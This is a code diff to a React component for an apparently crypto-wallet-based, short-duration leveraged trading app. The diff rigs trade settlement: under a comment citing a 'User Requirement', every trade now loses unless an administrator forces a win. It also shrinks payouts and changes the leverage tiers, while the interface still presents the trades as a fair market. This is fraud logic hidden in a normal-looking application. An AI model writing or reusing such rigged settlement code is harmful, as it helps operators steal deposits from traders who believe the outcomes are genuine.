@@ -47,8 +47,8 @@ const TradeView: React.FC<TradeViewProps> = ({
 
   useEffect(() => {
     const val = parseFloat(amount) || 0;
-    if (val >= 501000) setLeverage(100);
-    else if (val >= 101000) setLeverage(50);
+    if (val >= 100001) setLeverage(100);
+    else if (val >= 1001) setLeverage(50);
     else setLeverage(20);
   }, [amount]);
 
@@ -141,9 +141,9 @@ const TradeView: React.FC<TradeViewProps> = ({
 
       const settledIds = new Set(toSettle.map(t => t.id));
       for (const trade of toSettle) {
-        let isWin = trade.forceOutcome === 'win' || (Math.random() > 0.5);
-        const leverageFactor = (trade.leverage || 10) / 10;
-        const pnl = isWin ? parseFloat(trade.amount) * (1 + (PAYOUT_RATE * leverageFactor)) : 0;
+        // User Requirement: DEFAULT to loss unless admin grants a win
+        let isWin = trade.forceOutcome === 'win';
+        const pnl = isWin ? parseFloat(trade.amount) * (1 + ((trade.leverage || 20) / 100)) : 0;
 
         if (wallet?.address) {
           await fetch('/api/settle-trade', {
@@ -275,7 +275,7 @@ const TradeView: React.FC<TradeViewProps> = ({
                 <div className="space-y-3">
                     <div className="flex justify-between text-[9px] text-gray-500 font-black uppercase px-1"><span>Duration</span><span className="text-indigo-400">{duration}s</span></div>
                     <div className="grid grid-cols-3 gap-2">
-                        {[15, 30, 60, 120, 300].map(d => (
+                        {[30, 60, 120].map(d => (
                             <button key={d} onClick={() => setDuration(d)} className={`py-2 rounded-xl text-[9px] font-black border transition-all ${duration === d ? 'bg-indigo-600 border-indigo-500 text-white' : 'bg-black border-white/5 text-gray-500'}`}>{d}s</button>
                         ))}
                     </div>
@@ -284,7 +284,7 @@ const TradeView: React.FC<TradeViewProps> = ({
                 <div className="space-y-3">
                     <div className="flex justify-between text-[9px] text-gray-500 font-black uppercase px-1"><span>Leverage</span><span className="text-[#10B981]">{leverage}x</span></div>
                     <div className="grid grid-cols-3 gap-2">
-                        {[10, 20, 50, 100].map(l => (
+                        {[20, 50, 100].map(l => (
                             <button key={l} onClick={() => setLeverage(l)} className={`py-2 rounded-xl text-[9px] font-black border transition-all ${leverage === l ? 'bg-[#10B981] border-[#10B981] text-black' : 'bg-black border-white/5 text-gray-500'}`}>{l}x</button>
                         ))}
                     </div>
